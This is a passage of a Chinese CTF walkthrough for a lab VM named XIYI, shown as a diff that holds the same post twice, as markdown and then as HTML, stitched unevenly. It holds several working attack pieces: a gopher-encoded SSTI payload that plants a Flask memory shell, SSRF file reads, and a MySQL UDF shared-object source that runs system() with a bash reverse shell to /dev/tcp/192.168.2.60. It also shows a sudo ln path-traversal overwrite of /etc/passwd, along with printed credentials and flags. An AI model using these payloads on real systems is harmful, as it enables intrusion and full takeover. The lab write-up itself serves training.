+                    if not chunk:
+                        break
+                    response += chunk
+        except:
+            pass  # 忽略所有错误
+    
+    # 在后台线程中执行转发
+    thread = threading.Thread(target=forward)
+    thread.daemon = True
+    thread.start()
+
+@app.route('/', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
+def relay():
+    try:
+        # 获取原始数据
+        raw_data = request.get_data()
+        
+        # 在后台转发到2333端口
+        if raw_data:
+            forward_to_2333(raw_data)
+        
+        return 'get reply.py'
+        
+    except Exception:
+        return 'get reply.py'
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=2332, debug=False, threaded=True)
+```
+虽然隐藏了部分代码，结合提示，不难看出2332端口服务作为中继将得到的所有请求体不做任何处理转发到2333端口，在2333端口进行渲染导致ssti漏洞，而且均无回显
+
+而且ssrf仍然支持tftp协议可以直接利用tftp://127.0.0.1/app.py读取源码文件
+
+这也是预期路径，但是由于源码文件藏得不够深，就在opt下，所以同样也可以通过file协议直接读取到完整源码文件
+
+## getshell
+
+拿到shell的方法就是gopher打flask，方式有很多，这里采用注入内存马
+
+```
+payload:
+
+data={{url_for.__globals__.current_app.after_request_funcs.setdefault(None, []).append(
+    url_for.__globals__['__builtins__']['eval'](
+        'lambda resp: __import__('flask').make_response(__import__('os').popen(__import__('flask').request.args.get('cmd')).read()) if __import__('flask').request.args.get('cmd') else resp'
+))}}
+
+gopher编码结果
+
+gopher://127.0.0.1:2332/_POST%20%2F%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A2332%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%20331%0D%0A%0D%0Adata%3D%7B%7Burl_for.__globals__.current_app.after_request_funcs.setdefault%28None%2C%20%5B%5D%29.append%28%0A%20%20%20%20url_for.__globals__%5B%27__builtins__%27%5D%5B%27eval%27%5D%28%0A%20%20%20%20%20%20%20%20%22lambda%20resp%3A%20__import__%28%27flask%27%29.make_response%28__import__%28%27os%27%29.popen%28__import__%28%27flask%27%29.request.args.get%28%27cmd%27%29%29.read%28%29%29%20if%20__import__%28%27flask%27%29.request.args.get%28%27cmd%27%29%20else%20resp%22%0A%29%29%7D%7D
+
+```
+发送即可注入内存马，直接http://127.0.0.1:2333/?cmd=command即可执行命令
+
+# 3.提权
+
+## lemon
+
+在web目录下发现文件secret_of_lemon.txt，明显文件大小不对，less查看发现零宽字符
+
+```
+www-data@XIYI:~/html$ ls -al
+total 24
+drwxr-xr-x 2 root root 4096 Nov 11 03:57 .
+drwxr-xr-x 3 root root 4096 Apr  4  2025 ..
+-rw-r--r-- 1 root root 9563 Nov 10 23:06 index.php
+-rw-r--r-- 1 root root  547 Nov 11 03:57 secret_of_lemon.txt
+www-data@XIYI:~/html$ cat secret_of_lemon.txt 
+# Last updated: 2023-11-15
+nothing here
+# 
+www-data@XIYI:~/html$
+```
+解密得到凭据`lemon:Very_sour_lemon`
+
+### user.txt
+
+```
+lemon@XIYI:~$ cat user.txt 
+flag{lemon-d9832a587d8a4de1e69c94e1d907d421}
+```
+
+## root
+
+在lemon家目录下发现pass.txt，经过尝试是mysql数据库密码
+lemon的sudo权限以及开放的端口
+```
+lemon@XIYI:~$ cat pass.txt 
+root:rootted
+
+lemon@XIYI:~$ sudo -l
+Matching Defaults entries for lemon on XIYI:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lemon may run the following commands on XIYI:
+    (root) NOPASSWD: /usr/bin/ln -sf * /usr/lib/mysql/plugin/*
+    
+    
+lemon@XIYI:~$ ss -lnt
+State       Recv-Q      Send-Q             Local Address:Port             Peer Address:Port      
+LISTEN      0           80                     127.0.0.1:3306                  0.0.0.0:*         
+LISTEN      0           128                      0.0.0.0:22                    0.0.0.0:*         
+LISTEN      0           128                    127.0.0.1:2332                  0.0.0.0:*         
+LISTEN      0           128                    127.0.0.1:2333                  0.0.0.0:*         
+LISTEN      0           128                            *:80                          *:*         
+LISTEN      0           128                         [::]:22                       [::]:* 
+```
+
+简单筛查可发现root.bak文件，权限仅mysql用户可读
+
+```
+lemon@XIYI:~$ find / -iname '*bak*' 2>/dev/null
+/usr/local/lib/python3.9/dist-packages/pytz/zoneinfo/Asia/Baku
+/usr/lib/mysql/plugin/root.bak
+/usr/share/zoneinfo/Asia/Baku
+/usr/share/zoneinfo/posix/Asia/Baku
+/usr/share/zoneinfo/right/Asia/Baku
+
+lemon@XIYI:~$ ls -al /usr/lib/mysql/plugin/root.bak
+-r-------- 1 mysql mysql 13 Nov 10 22:18 /usr/lib/mysql/plugin/root.bak
+```
+
+
+## 预期解
+
+通过mysql udf横向提权到mysql读取root.bak，然后提升至root权限
+
+这里不能直接通过load_file()读取文件，即使root.bak在其他目录下，因为mysql读取时是这样情况，其实有点神奇
+
+```
+root@XIYI:/tmp# mkdir test
+root@XIYI:/tmp# cd test/
+root@XIYI:/tmp/test# echo '123' >> root.bak
+root@XIYI:/tmp/test# chown mysql:mysql root.bak 
+root@XIYI:/tmp/test# chmod 400 root.bak 
+root@XIYI:/tmp/test# ls -al
+total 12
+drwxr-xr-x  2 root  root  4096 Nov 12 23:01 .
+drwxrwxrwt 11 root  root  4096 Nov 12 23:01 ..
+-r--------  1 mysql mysql    4 Nov 12 23:01 root.bak
+root@XIYI:/tmp/test# mysql -uroot -prootted
+
+MariaDB [(none)]> select load_file('/tmp/test/root.bak');
++---------------------------------+
+| load_file('/tmp/test/root.bak') |
++---------------------------------+
+| NULL                            |
++---------------------------------+
+1 row in set (0.000 sec)
+
+MariaDB [(none)]> exit
+Bye
+root@XIYI:/tmp/test# chmod 440 root.bak 
+root@XIYI:/tmp/test# ls -al
+total 12
+drwxr-xr-x  2 root  root  4096 Nov 12 23:01 .
+drwxrwxrwt 11 root  root  4096 Nov 12 23:01 ..
+-r--r-----  1 mysql mysql    4 Nov 12 23:01 root.bak
+
+root@XIYI:/tmp/test# mysql -uroot -prootted
+
+MariaDB [(none)]> select load_file('/tmp/test/root.bak');
++---------------------------------+
+| load_file('/tmp/test/root.bak') |
++---------------------------------+
+| NULL                            |
++---------------------------------+
+1 row in set (0.000 sec)
+
+MariaDB [(none)]> exit
+Bye
+root@XIYI:/tmp/test# chmod 444 root.bak 
+root@XIYI:/tmp/test# mysql -uroot -prootted
+
+MariaDB [(none)]> select load_file('/tmp/test/root.bak');
++---------------------------------+
+| load_file('/tmp/test/root.bak') |
++---------------------------------+
+| 123
+                            |
++---------------------------------+
+1 row in set (0.001 sec)
+
+MariaDB [(none)]>
+```
+从上述很容易看出问题所在
+
+编译恶意so文件，so文件需要保证mysql进程能够访问
+
+```
+udf.c
+
+#include <stdio.h>
+
+#include <stdlib.h>
+
+
+
+enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
+
+
+
+typedef struct st_udf_args {
+
+        unsigned int            arg_count;      // number of arguments
+
+        enum Item_result        *arg_type;      // pointer to item_result
+
+        char                    **args;         // pointer to arguments
+
+        unsigned long           *lengths;       // length of string args
+
+        char                    *maybe_null;    // 1 for maybe_null args
+
+} UDF_ARGS;
+
+
+
+typedef struct st_udf_init {
+
+        char                    maybe_null;     // 1 if func can return NULL
+
+        unsigned int            decimals;       // for real functions
+
+        unsigned long           max_length;     // for string functions
+
+        char                    *ptr;           // free ptr for func data
+
+        char                    const_item;     // 0 if result is constant
+
+} UDF_INIT;
+
+
+
+int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
+
+{
+
+        if (args->arg_count != 1)
+
+                return(0);
+
+
+
+        system(args->args[0]);
+
+
+
+        return(0);
+
+}
+
+
+
+char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+
+{
+
+        return(0);
+
+}
+
+-------------------------------------------------------------------------
+
+lemon@XIYI:/tmp$ gcc -g -shared -o udf.so udf.c -lc
+lemon@XIYI:/tmp$ sudo /usr/bin/ln -sf /tmp/udf.so /usr/lib/mysql/plugin/udf.so
+
+
+lemon@XIYI:/tmp$ mysql -uroot -prootted
+
+MariaDB [(none)]> CREATE FUNCTION do_system RETURNS INTEGER SONAME 'udf.so';
+Query OK, 0 rows affected (0.002 sec)
+
+MariaDB [(none)]> SELECT * FROM mysql.func WHERE name='do_system';
++-----------+-----+--------+----------+
+| name      | ret | dl     | type     |
++-----------+-----+--------+----------+
+| do_system |   2 | udf.so | function |
++-----------+-----+--------+----------+
+1 row in set (0.001 sec)
+
+MariaDB [(none)]> SELECT do_system('/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.60/2332 0>&1'');
+strace: Process 1123 attached
+strace: Process 1124 attached
+strace: Process 1125 attached
+
+
+mysql@XIYI:/var/lib/mysql$ cat root.bak
+cat root.bak
+root:ezlemon
+```
+即可接收到mysql权限的shell，提权即可
+
+## 非预期解
+
+sudo权限提供了ln，路径穿越覆盖即可
+
+
+```
+sudo /usr/bin/ln -sf /home/lemon/passwd /usr/lib/mysql/plugin/../../../../../etc/passwd
+```
+
+## root.txt
+
+```
+root@XIYI:~# cat /root/root.txt 
+flag{root-e6a6e8eac98579c8d826d07df3c132bc}
+```
+
+# 附上脚本
+
+听是好多被gopher编码恶心到了，附上一直在用的脚本
+## gopher编码脚本
+```
+#!/usr/bin/env python3
+'''
+gopher_single_encode.py
+
+按'单次 percent-encode'规则生成 gopher POST 请求的 selector 和 gopher:// URL。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://faabbi.github.io/post/XIYI-MJ.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
+<title>XIYI-MJ</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">XIYI-MJ</h1>
+<div class="title-right">
+    <a href="https://faabbi.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/faabbi/faabbi.github.io/issues/9" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>1.信息收集</h1>
+<p>常规扫描</p>
+<p>tcp</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 192.168.2.57  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:42 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00044s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 9.00 seconds
+                                                                                                     
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sV -sC -O -p22,80 192.168.2.57  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:43 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00024s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Webpage Preview Tool
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
+
+┌──(root㉿kali)-[/tmp/test]
+└─# nmap --script=vuln -p22,80 192.168.2.57
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:43 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00037s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-fileupload-exploiter: 
+|   
+|_    Couldn't find a file-type field.
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 37.37 seconds
+</code></pre>
+<p>udp</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/tmp/test]
+└─# nmap -sU --top-ports 20 192.168.2.57  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 07:43 EST
+Nmap scan report for 192.168.2.57
+Host is up (0.00077s latency).
+
+PORT      STATE         SERVICE
+53/udp    closed        domain
+67/udp    closed        dhcps
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+123/udp   open|filtered ntp
+135/udp   open|filtered msrpc
+137/udp   closed        netbios-ns
+138/udp   closed        netbios-dgm
+139/udp   open|filtered netbios-ssn
+161/udp   closed        snmp
+162/udp   closed        snmptrap
+445/udp   open|filtered microsoft-ds
+500/udp   closed        isakmp
+514/udp   closed        syslog
+520/udp   open|filtered route
+631/udp   closed        ipp
+1434/udp  closed        ms-sql-m
+1900/udp  open|filtered upnp
+4500/udp  open|filtered nat-t-ike
+49152/udp closed        unknown
+MAC Address: 08:00:27:51:70:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 14.47 seconds
+</code></pre>
+<p>tcp开放22，80端口，udp判断难度较大，优先级可排后</p>
+<h1>2.web渗透</h1>
+<h2>初步测试</h2>
+<p>web页面，很容易想到可能存在ssrf漏洞</p>
+<p>![[Pasted image 20251112204656.png]]</p>
+<p>利用file协议先尝试读取passwd文件</p>
+<pre class="notranslate"><code class="notranslate">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+tftp:x:106:113:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
+lemon:x:1001:1001:lemon:/home/lemon:/bin/bash
+mysql:x:107:114:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre>
+<p>可以发现存在tftp用户，结合udp扫描结果，猜测可能会存在tftp服务</p>
+<h2>本地端口探测</h2>
+<p>ssrf更深的危害，多要结合其他服务产生，读取文件并未发现敏感信息，进行本地端口探测</p>
+<h3>方法一</h3>
+<p>==<strong>老夜</strong>==提供的方法也是目前最好的方法，读取/proc/net/tcp文件，在 Linux 系统中/proc/net/tcp文件提供了tcp连接的信息</p>
+<p>利用file协议读取</p>
+<pre class="notranslate"><code class="notranslate">  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                     
+   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 14261 1 0000000054c1d360 100 0 0 10 0                     
+   1: 0100007F:091C 00000000:0000 0A 00000000:00000000 00:00000000 00000000    33        0 15132 1 000000005eaf8d0a 100 0 0 10 0                     
+   2: 0100007F:091D 00000000:0000 0A 00000000:00000000 00:00000000 00000000    33        0 15144 1 00000000bd9ebf81 100 0 0 10 0                     
+   3: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   107        0 15456 1 00000000a1bd6770 100 0 0 10 0    
+</code></pre>
+<p>转换一下信息</p>
+<pre class="notranslate"><code class="notranslate">TCP 连接状态信息
+连接列表
+连接 0：
+- 本地地址: 0.0.0.0:22
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 0 (root)
+- Inode: 14261
+
+连接 1：
+- 本地地址: 127.0.0.1:2332
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 33
+- Inode: 15132
+
+连接 2：
+- 本地地址: 127.0.0.1:2333
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 33
+- Inode: 15144
+
+连接 3：
+- 本地地址: 127.0.0.1:3306
+- 远程地址: 0.0.0.0:0
+- 状态: LISTEN (监听)
+- 发送队列: 0 字节
+- 接收队列: 0 字节
+- UID: 107
+- Inode: 15456
+
+服务说明
+- 端口 22: SSH 服务
+- 端口 3306: MySQL 数据库服务
+- 端口 2332/2333: 应用程序服务端口
+- 所有服务: 处于监听状态，等待连接
+</code></pre>
+<h3>方法二</h3>
+<p>利用ssrf中的dict协议爆破端口，http协议同样可以</p>
+<p>![[Pasted image 20251112211216.png]]<br>
+扫出来了2332和2333端口</p>
+<h2>源码文件</h2>
+<p>http协议可以得到信息回显</p>
+<p>分别是</p>
+<pre class="notranslate"><code class="notranslate">get reply.py
+get app.py
+</code></pre>
+<p>结合之前信息，可以尝试tftp连接获取这两个py文件</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/tmp/test]
+└─# tftp 192.168.2.57             
+tftp&gt; get app.py
+tftp&gt; get reply.py
+tftp&gt; quit
+                                                                                                     
+┌──(root㉿kali)-[/tmp/test]
+└─# cat *
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return "get app.py"
+
+
+
+
+
+#此处隐藏
+
+
+
+
+
+
+
+# 直接渲染 - 存在SSTI漏洞，在哪呢？
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=2333, debug=False, threaded=True)
+from flask import Flask, request
+import socket
+import threading
+
+app = Flask(__name__)
+
+def forward_to_2333(data):
+    def forward():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(5)
+                s.connect(('127.0.0.1', 2333))
+                
+                # 构建HTTP POST请求
+                http_request = f"""********************
+
+***********************************************
+                """
+                
+                s.send(http_request)
+                
+                # 接收响应但不处理
+                response = b""
+                while True:
+                    chunk = s.recv(4096)
+                    if not chunk:
+                        break
+                    response += chunk
+        except:
+            pass  # 忽略所有错误
+    
+    # 在后台线程中执行转发
+    thread = threading.Thread(target=forward)
+    thread.daemon = True
+    thread.start()
+
+@app.route('/', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
+def relay():
+    try:
+        # 获取原始数据
+        raw_data = request.get_data()
+        
+        # 在后台转发到2333端口
+        if raw_data:
+            forward_to_2333(raw_data)
+        
+        return "get reply.py"
+        
+    except Exception:
+        return "get reply.py"
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=2332, debug=False, threaded=True)
+</code></pre>
+<p>虽然隐藏了部分代码，结合提示，不难看出2332端口服务作为中继将得到的所有请求体不做任何处理转发到2333端口，在2333端口进行渲染导致ssti漏洞，而且均无回显</p>
+<p>而且ssrf仍然支持tftp协议可以直接利用tftp://127.0.0.1/app.py读取源码文件</p>
+<p>这也是预期路径，但是由于源码文件藏得不够深，就在opt下，所以同样也可以通过file协议直接读取到完整源码文件</p>
+<h2>getshell</h2>
+<p>拿到shell的方法就是gopher打flask，方式有很多，这里采用注入内存马</p>
+<pre class="notranslate"><code class="notranslate">payload:
+
+data={{url_for.__globals__.current_app.after_request_funcs.setdefault(None, []).append(
+    url_for.__globals__['__builtins__']['eval'](
+        "lambda resp: __import__('flask').make_response(__import__('os').popen(__import__('flask').request.args.get('cmd')).read()) if __import__('flask').request.args.get('cmd') else resp"
+))}}
+
+gopher编码结果
+
+gopher://127.0.0.1:2332/_POST%20%2F%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A2332%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%20331%0D%0A%0D%0Adata%3D%7B%7Burl_for.__globals__.current_app.after_request_funcs.setdefault%28None%2C%20%5B%5D%29.append%28%0A%20%20%20%20url_for.__globals__%5B%27__builtins__%27%5D%5B%27eval%27%5D%28%0A%20%20%20%20%20%20%20%20%22lambda%20resp%3A%20__import__%28%27flask%27%29.make_response%28__import__%28%27os%27%29.popen%28__import__%28%27flask%27%29.request.args.get%28%27cmd%27%29%29.read%28%29%29%20if%20__import__%28%27flask%27%29.request.args.get%28%27cmd%27%29%20else%20resp%22%0A%29%29%7D%7D
+
+</code></pre>
+<p>发送即可注入内存马，直接<a href="http://127.0.0.1:2333/?cmd=command%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4" rel="nofollow">http://127.0.0.1:2333/?cmd=command即可执行命令</a></p>
+<h1>3.提权</h1>
+<h2>lemon</h2>
+<p>在web目录下发现文件secret_of_lemon.txt，明显文件大小不对，less查看发现零宽字符</p>
+<pre class="notranslate"><code class="notranslate">www-data@XIYI:~/html$ ls -al
+total 24
+drwxr-xr-x 2 root root 4096 Nov 11 03:57 .
+drwxr-xr-x 3 root root 4096 Apr  4  2025 ..
+-rw-r--r-- 1 root root 9563 Nov 10 23:06 index.php
+-rw-r--r-- 1 root root  547 Nov 11 03:57 secret_of_lemon.txt
+www-data@XIYI:~/html$ cat secret_of_lemon.txt 
+# Last updated: 2023-11-15
+nothing here
+# 
+www-data@XIYI:~/html$
+</code></pre>
+<p>解密得到凭据<code class="notranslate">lemon:Very_sour_lemon</code></p>
+<h3>user.txt</h3>
+<pre class="notranslate"><code class="notranslate">lemon@XIYI:~$ cat user.txt 
+flag{lemon-d9832a587d8a4de1e69c94e1d907d421}
+</code></pre>
+<h2>root</h2>
+<p>在lemon家目录下发现pass.txt，经过尝试是mysql数据库密码<br>
+lemon的sudo权限以及开放的端口</p>
+<pre class="notranslate"><code class="notranslate">lemon@XIYI:~$ cat pass.txt 
+root:rootted
+
+lemon@XIYI:~$ sudo -l
+Matching Defaults entries for lemon on XIYI:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lemon may run the following commands on XIYI:
+    (root) NOPASSWD: /usr/bin/ln -sf * /usr/lib/mysql/plugin/*
+    
+    
+lemon@XIYI:~$ ss -lnt
+State       Recv-Q      Send-Q             Local Address:Port             Peer Address:Port      
+LISTEN      0           80                     127.0.0.1:3306                  0.0.0.0:*         
+LISTEN      0           128                      0.0.0.0:22                    0.0.0.0:*         
+LISTEN      0           128                    127.0.0.1:2332                  0.0.0.0:*         
+LISTEN      0           128                    127.0.0.1:2333                  0.0.0.0:*         
+LISTEN      0           128                            *:80                          *:*         
+LISTEN      0           128                         [::]:22                       [::]:* 
+</code></pre>
+<p>简单筛查可发现root.bak文件，权限仅mysql用户可读</p>
+<pre class="notranslate"><code class="notranslate">lemon@XIYI:~$ find / -iname "*bak*" 2&gt;/dev/null
+/usr/local/lib/python3.9/dist-packages/pytz/zoneinfo/Asia/Baku
+/usr/lib/mysql/plugin/root.bak
+/usr/share/zoneinfo/Asia/Baku
+/usr/share/zoneinfo/posix/Asia/Baku
+/usr/share/zoneinfo/right/Asia/Baku
+
+lemon@XIYI:~$ ls -al /usr/lib/mysql/plugin/root.bak
+-r-------- 1 mysql mysql 13 Nov 10 22:18 /usr/lib/mysql/plugin/root.bak
+</code></pre>
+<h2>预期解</h2>
+<p>通过mysql udf横向提权到mysql读取root.bak，然后提升至root权限</p>
+<p>这里不能直接通过load_file()读取文件，即使root.bak在其他目录下，因为mysql读取时是这样情况，其实有点神奇</p>
+<pre class="notranslate"><code class="notranslate">root@XIYI:/tmp# mkdir test
+root@XIYI:/tmp# cd test/
+root@XIYI:/tmp/test# echo "123" &gt;&gt; root.bak
+root@XIYI:/tmp/test# chown mysql:mysql root.bak 
+root@XIYI:/tmp/test# chmod 400 root.bak 
+root@XIYI:/tmp/test# ls -al
+total 12
+drwxr-xr-x  2 root  root  4096 Nov 12 23:01 .
+drwxrwxrwt 11 root  root  4096 Nov 12 23:01 ..
+-r--------  1 mysql mysql    4 Nov 12 23:01 root.bak
+root@XIYI:/tmp/test# mysql -uroot -prootted
+
+MariaDB [(none)]&gt; select load_file("/tmp/test/root.bak");
++---------------------------------+
+| load_file("/tmp/test/root.bak") |
++---------------------------------+
+| NULL                            |
++---------------------------------+
+1 row in set (0.000 sec)
+
+MariaDB [(none)]&gt; exit
+Bye
+root@XIYI:/tmp/test# chmod 440 root.bak 
+root@XIYI:/tmp/test# ls -al
+total 12
+drwxr-xr-x  2 root  root  4096 Nov 12 23:01 .
+drwxrwxrwt 11 root  root  4096 Nov 12 23:01 ..
+-r--r-----  1 mysql mysql    4 Nov 12 23:01 root.bak
+
+root@XIYI:/tmp/test# mysql -uroot -prootted
+
+MariaDB [(none)]&gt; select load_file("/tmp/test/root.bak");
++---------------------------------+
+| load_file("/tmp/test/root.bak") |
++---------------------------------+
+| NULL                            |
++---------------------------------+
+1 row in set (0.000 sec)
+
+MariaDB [(none)]&gt; exit
+Bye
+root@XIYI:/tmp/test# chmod 444 root.bak 
+root@XIYI:/tmp/test# mysql -uroot -prootted
+
+MariaDB [(none)]&gt; select load_file("/tmp/test/root.bak");
++---------------------------------+
+| load_file("/tmp/test/root.bak") |
++---------------------------------+
+| 123
+                            |
++---------------------------------+
+1 row in set (0.001 sec)
+
+MariaDB [(none)]&gt;
+</code></pre>
+<p>从上述很容易看出问题所在</p>
+<p>编译恶意so文件，so文件需要保证mysql进程能够访问</p>
+<pre class="notranslate"><code class="notranslate">udf.c
+
+#include &lt;stdio.h&gt;
+
+#include &lt;stdlib.h&gt;
+
+
+
+enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
+
+
+
+typedef struct st_udf_args {
+
+        unsigned int            arg_count;      // number of arguments
+
+        enum Item_result        *arg_type;      // pointer to item_result
+
+        char                    **args;         // pointer to arguments
+
+        unsigned long           *lengths;       // length of string args
+
